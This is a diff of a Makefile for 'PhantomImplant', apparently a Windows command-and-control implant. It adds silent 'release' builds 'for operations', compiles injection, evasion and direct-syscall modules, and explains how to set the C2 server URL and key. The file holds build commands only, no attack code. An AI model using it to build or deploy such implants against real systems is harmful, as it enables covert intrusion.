@@ -1,64 +1,64 @@
 # PhantomImplant - Build System
-# Cross-compile from Linux (MinGW) or native Windows (MSVC)
+#
+# Two build modes:
+#   make debug   - Test mode with console output (for development)
+#   make release - Silent implant, no console window (for operations)
 
-# =============================================
-# MinGW Cross-Compilation (from Kali/Linux)
-# =============================================
-CC_WIN64    = x86_64-w64-mingw32-gcc
-ASM_WIN64   = nasm
-CFLAGS      = -Wall -O2 -Iinclude -DUNICODE -D_UNICODE
-LDFLAGS     = -lntdll -s -nostdlib -lkernel32 -luser32
-
-# Output
+CC          = x86_64-w64-mingw32-gcc
+NASM        = nasm
+STRIP       = x86_64-w64-mingw32-strip
+CFLAGS      = -Wall -O2 -Iinclude
+LDFLAGS     = -lntdll -lbcrypt -lwinhttp -lcrypt32
 BUILD_DIR   = build
-BIN_NAME    = phantom-implant.exe
-HASHGEN     = hashgen.exe
 
-# Sources
-SRC         = src/main.c src/api.c src/syscalls.c
+SRC         = src/api.c src/syscalls.c src/crypto.c src/injection.c \
+              src/transport.c src/msgpack.c src/evasion.c src/main.c
 ASM_SRC     = asm/syscalls.asm
-HASHGEN_SRC = src/hashgen.c
+ASM_OBJ     = $(BUILD_DIR)/syscalls.obj
+
+.PHONY: all debug release clean hashgen gen-hashes help
+
+# Default target
+all: debug
 
 # =============================================
-# Targets
+# Debug build: console output, test harness
 # =============================================
+debug: $(ASM_OBJ) | $(BUILD_DIR)
+	@echo "[*] Building PhantomImplant (DEBUG mode)..."
+	$(CC) $(CFLAGS) -DDEBUG_MODE $(SRC) $(ASM_OBJ) -o $(BUILD_DIR)/phantom-implant-debug.exe $(LDFLAGS)
+	@echo "[+] Debug build: $(BUILD_DIR)/phantom-implant-debug.exe"
+	@ls -lh $(BUILD_DIR)/phantom-implant-debug.exe
 
-.PHONY: all clean hashgen test-hashgen help
+# =============================================
+# Release build: silent, no console, stripped
+# =============================================
+release: $(ASM_OBJ) | $(BUILD_DIR)
+	@echo "[*] Building PhantomImplant (RELEASE mode)..."
+	$(CC) $(CFLAGS) -mwindows $(SRC) $(ASM_OBJ) -o $(BUILD_DIR)/phantom-implant.exe $(LDFLAGS) -s
+	$(STRIP) $(BUILD_DIR)/phantom-implant.exe 2>/dev/null || true
+	@echo "[+] Release build: $(BUILD_DIR)/phantom-implant.exe"
+	@ls -lh $(BUILD_DIR)/phantom-implant.exe
 
-all: $(BUILD_DIR)/$(BIN_NAME)
-
-# Build the implant (MinGW + NASM)
-$(BUILD_DIR)/$(BIN_NAME): $(SRC) $(ASM_SRC) | $(BUILD_DIR)
+# =============================================
+# Assemble NASM syscall stubs
+# =============================================
+$(ASM_OBJ): $(ASM_SRC) | $(BUILD_DIR)
 	@echo "[*] Assembling syscall stubs..."
-	$(ASM_WIN64) -f win64 $(ASM_SRC) -o $(BUILD_DIR)/syscalls.obj
-	@echo "[*] Compiling implant..."
-	$(CC_WIN64) $(CFLAGS) $(SRC) $(BUILD_DIR)/syscalls.obj -o $@ $(LDFLAGS)
-	@echo "[+] Built: $@"
-	@ls -lh $@
+	$(NASM) -f win64 $(ASM_SRC) -o $(ASM_OBJ)
 
-# Build hash generator (native Linux or MinGW)
-hashgen: $(BUILD_DIR)/$(HASHGEN)
+# =============================================
+# Hash generator utility (runs on Linux)
+# =============================================
+hashgen: | $(BUILD_DIR)
+	gcc src/hashgen.c -o $(BUILD_DIR)/hashgen-linux
+	@echo "[+] Hash generator: $(BUILD_DIR)/hashgen-linux"
 
-$(BUILD_DIR)/$(HASHGEN): $(HASHGEN_SRC) | $(BUILD_DIR)
-	@echo "[*] Building hash generator..."
-	gcc $(HASHGEN_SRC) -o $(BUILD_DIR)/hashgen-linux
-	@echo "[+] Built: $(BUILD_DIR)/hashgen-linux"
-	@echo "[*] Run: ./$(BUILD_DIR)/hashgen-linux > hashes.h"
-
-# Generate hashes and update common.h
-gen-hashes: $(BUILD_DIR)/hashgen-linux
-	@echo "[*] Generating API hashes..."
-	./$(BUILD_DIR)/hashgen-linux
-
-$(BUILD_DIR)/hashgen-linux: $(HASHGEN_SRC) | $(BUILD_DIR)
-	gcc $(HASHGEN_SRC) -o $@
-
-# Build for Windows (MSVC) - run from VS Developer Command Prompt
-msvc:
-	@echo "[*] Building with MSVC..."
-	@echo "    Run from VS Developer Command Prompt:"
-	@echo "    ml64 /c /Fo build\\syscalls.obj asm\\syscalls.asm"
-	@echo "    cl /O2 /Iinclude src\\main.c src\\api.c src\\syscalls.c build\\syscalls.obj /Fe:build\\phantom-implant.exe"
+gen-hashes: hashgen
+	@echo ""
+	@./$(BUILD_DIR)/hashgen-linux
+	@echo ""
+	@echo "Copy the output above into include/common.h"
 
 $(BUILD_DIR):
 	mkdir -p $(BUILD_DIR)
@@ -66,14 +66,28 @@ $(BUILD_DIR):
 clean:
 	rm -rf $(BUILD_DIR)
 
+# =============================================
+# Help
+# =============================================
 help:
-	@echo "PhantomImplant Build Targets:"
-	@echo "  make all         - Build implant (MinGW cross-compile)"
-	@echo "  make hashgen     - Build hash generator utility"
-	@echo "  make gen-hashes  - Generate and print API hashes"
-	@echo "  make msvc        - Print MSVC build commands"
-	@echo "  make clean       - Remove build artifacts"
 	@echo ""
-	@echo "MSVC Build (on Windows):"
-	@echo "  ml64 /c /Fo build\\syscalls.obj asm\\syscalls.asm"
-	@echo "  cl /O2 /Iinclude src\\*.c build\\syscalls.obj /Fe:build\\phantom-implant.exe"
+	@echo "  PhantomImplant Build System"
+	@echo "  =========================="
+	@echo ""
+	@echo "  Build targets:"
+	@echo "    make debug      Build with console output (for testing)"
+	@echo "    make release    Build silent implant (for operations)"
+	@echo "    make hashgen    Build hash generator utility"
+	@echo "    make gen-hashes Print API/module/syscall hashes"
+	@echo "    make clean      Remove build artifacts"
+	@echo ""
+	@echo "  Configuration:"
+	@echo "    1. Edit C2_SERVER_URL in src/main.c"
+	@echo "    2. Embed your server's RSA public key in g_ServerPubKeyDer[]"
+	@echo "    3. Build: make release"
+	@echo ""
+	@echo "  MSVC Build (Windows):"
+	@echo "    ml64 /c /Fo build\\syscalls.obj asm\\syscalls.asm"
+	@echo "    cl /O2 /Iinclude src\\*.c build\\syscalls.obj /Fe:build\\phantom-implant.exe"
+	@echo "       /link bcrypt.lib winhttp.lib crypt32.lib ntdll.lib /SUBSYSTEM:WINDOWS"
+	@echo ""
